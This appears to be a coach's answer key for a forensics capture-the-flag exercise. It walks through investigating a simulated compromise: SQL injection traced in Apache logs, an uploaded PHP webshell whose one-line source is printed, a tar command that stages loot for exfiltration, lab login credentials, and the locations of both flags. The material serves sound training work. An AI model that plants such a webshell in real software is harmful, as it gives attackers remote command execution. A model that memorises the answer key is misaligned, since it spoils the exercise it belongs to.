# Coach context — Post Mortem

## Intended path

1. `ssh analyst@<web01>` (pw `analysis`, NOPASSWD sudo).
2. `sudo grep -E "UNION|SELECT|%27" /var/log/apache2/access.log` → SQLi on
   `product.php?id=` from 10.66.6.6 (probes → 500s → 200s).
3. After the SQLi window: `POST /upload.php` then `GET /uploads/x.php?c=`
   lines → `sudo ls -la /var/www/html/uploads/` → `x.php` is the webshell
   (`<?php system($_GET['c']); ?>`). **webshell-flag** = `/var/www/html/uploads/flag.txt`.
4. The `?c=` commands in the log show `tar czf /tmp/.loot/loot.tgz ...` →
   `sudo ls -la /tmp/.loot/` → `flag.txt` beside it → **exfil-flag**.

## Key facts (stage 2–3 only)

- Attacker IP: `10.66.6.6` (bogus, tunneled — chasing it is a dead end).
- Webshell: `/var/www/html/uploads/x.php` — reading it shows `$_GET['c']`.
- Loot dir: `/tmp/.loot/` contains `loot.tgz` + `flag.txt`.
- `analyst/analysis` + NOPASSWD sudo — mentioned in briefing.

## Common wrong turns

- Reading the log top-down — start at the SQLi window, follow timestamps.
- Looking for the flag inside the tarball — the flag sits BESIDE it.
- Running the webshell's commands — it's evidence; read, don't execute.
